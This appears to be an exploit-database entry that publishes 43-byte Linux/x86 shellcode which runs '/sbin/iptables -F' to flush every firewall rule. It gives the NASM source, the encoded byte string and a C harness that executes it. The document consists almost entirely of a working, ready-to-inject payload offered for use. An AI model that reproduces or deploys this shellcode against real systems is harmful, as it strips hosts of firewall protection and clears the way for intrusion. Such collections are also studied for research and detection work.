# Title: Linux/x86 - /sbin/iptables -F Shellcode (43 bytes)
# Author: Xavi Beltran
# Date: 11/05/2019
# Contact: xavibeltran@protonmail.com
# Webpage: https://xavibel.com
# Purpose: flush iptables rules
# Tested On: Ubuntu 3.5.0-17-generic
# Arch: x86
# Size: 43 bytes

#################################### iptables-flush.nasm  ####################################

global _start

section .text
_start:
	xor eax, eax
	push eax
	push word 0x462d
	mov esi, esp
	push eax
	push dword 0x73656c62
	push dword 0x61747069
	mov edi,esp
	push dword 0x2f2f6e69
	push dword 0x62732f2f
	mov ebx, esp
	push eax
	push esi
	push edi
	mov ecx, esp
	mov al, 11
	int 0x80

####################################### shellcode.c  #######################################

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x89\xe7\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x73\x62\x89\xe3\x50\x56\x57\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}